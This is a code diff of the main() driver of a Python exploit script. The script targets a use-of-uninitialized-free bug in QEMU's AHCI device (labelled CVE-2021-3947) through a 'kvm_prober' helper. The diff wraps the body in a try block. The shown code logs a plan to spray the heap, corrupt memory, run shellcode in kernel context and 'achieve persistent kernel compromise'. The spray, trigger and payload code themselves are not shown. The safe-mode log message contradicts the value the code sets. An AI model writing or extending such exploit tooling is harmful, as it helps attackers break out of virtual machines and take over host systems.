@@ -917,55 +917,58 @@ def monitor_kernel_logs(duration: int = 30, watch_for_pattern: str = '0x42') -> 
 
 def main():
     global DEBUG
-    
+
     args = parse_args()
     DEBUG = args.debug
-    
-    log_info("=" * 70)
-    log_info("AHCI UNINITIALIZED FREE EXPLOIT - ENHANCED VERSION")
-    log_info("Target: QEMU AHCI Device (hw/ide/ahci.c:1007) - CVE-2021-3947")
-    log_info("Memory access via: kvm_prober")
-    log_info(f"kvm_prober path: {args.kvm_prober}")
-    log_info(f"Payload: {args.payload}")
-    log_info("=" * 70)
-    log_info("")
-    log_info("Exploitation Strategy:")
-    log_info("1. Spray heap with 1000 fake chunks (0x290 bytes each)")
-    log_info("2. Trigger AHCI vulnerability via memory corruption")
-    log_info("3. Execute shellcode payload in kernel context")
-    log_info("4. Achieve persistent kernel compromise")
-    log_info("")
-    
-    # Adjust for safe mode
-    spray_count = args.spray_count
-    if args.safe_mode:
-        spray_count = 10
-        log_warning("SAFE MODE ENABLED - Using reduced spray count (100 chunks)")
-    
-    # Check if we can run kvm_prober
-    if not os.path.exists(args.kvm_prober):
-        log_error(f"kvm_prober not found at {args.kvm_prober}")
-        sys.exit(1)
-    
-    if not os.access(args.kvm_prober, os.X_OK):
-        log_error(f"kvm_prober is not executable")
-        sys.exit(1)
-    
-    exploit = AHCIExploit(
-        kvm_prober_path=args.kvm_prober,
-        chunk_size=args.chunk_size,
-        spray_count=spray_count,
-        retry_count=args.retry_count,
-        payload_type=args.payload
-    )
-    
-    if args.debug:
-        exploit.set_debug(True)
-    
-    # Show strategy if requested
-    if args.show_strategy:
-        exploit.demonstrate_qemu_function_targeting()
-        sys.exit(0)
+
+    try:
+        log_info("=" * 70)
+        log_info("AHCI UNINITIALIZED FREE EXPLOIT - ENHANCED VERSION")
+        log_info("Target: QEMU AHCI Device (hw/ide/ahci.c:1007) - CVE-2021-3947")
+        log_info("Memory access via: kvm_prober")
+        log_info(f"kvm_prober path: {args.kvm_prober}")
+        log_info(f"Payload: {args.payload}")
+        log_info("=" * 70)
+        log_info("")
+        log_info("Exploitation Strategy:")
+        log_info("1. Spray heap with 1000 fake chunks (0x290 bytes each)")
+        log_info("2. Trigger AHCI vulnerability via memory corruption")
+        log_info("3. Execute shellcode payload in kernel context")
+        log_info("4. Achieve persistent kernel compromise")
+        log_info("")
+
+        # Adjust for safe mode
+        spray_count = args.spray_count
+        if args.safe_mode:
+            spray_count = 10
+            log_warning("SAFE MODE ENABLED - Using reduced spray count (100 chunks)")
+
+        # Check if we can run kvm_prober
+        if not os.path.exists(args.kvm_prober):
+            log_error(f"kvm_prober not found at {args.kvm_prober}")
+            sys.exit(1)
+
+        if not os.access(args.kvm_prober, os.X_OK):
+            log_error(f"kvm_prober is not executable")
+            sys.exit(1)
+
+        exploit = AHCIExploit(
+            kvm_prober_path=args.kvm_prober,
+            chunk_size=args.chunk_size,
+            spray_count=spray_count,
+            retry_count=args.retry_count,
+            payload_type=args.payload
+        )
+
+        if args.debug:
+            exploit.set_debug(True)
+
+        # Show strategy if requested
+        if args.show_strategy:
+            exploit.demonstrate_qemu_function_targeting()
+            sys.exit(0)
+
+        # Test trigger mode
         if args.test_trigger:
             log_info("TEST MODE: Vulnerability trigger only")
             log_info("-" * 70)
@@ -983,27 +986,29 @@ def main():
                 log_success("=" * 70)
                 log_success("EXPLOIT EXECUTION COMPLETED!")
                 log_success("=" * 70)
-                
+
                 # Optional monitoring
                 if args.monitor:
                     log_info("")
                     log_info("Starting kernel log monitoring...")
                     time.sleep(2)
                     monitor_kernel_logs(duration=30, watch_for_pattern='42')
-                
+
                 sys.exit(0)
             else:
                 log_error("Exploit execution failed")
                 sys.exit(1)
-            
+
     except KeyboardInterrupt:
         log_info("\nExploitation interrupted by user")
         sys.exit(0)
+
     except Exception as e:
         log_error(f"Unexpected error: {e}")
         import traceback
         traceback.print_exc()
         sys.exit(1)
+
 
 if __name__ == "__main__":
     main()
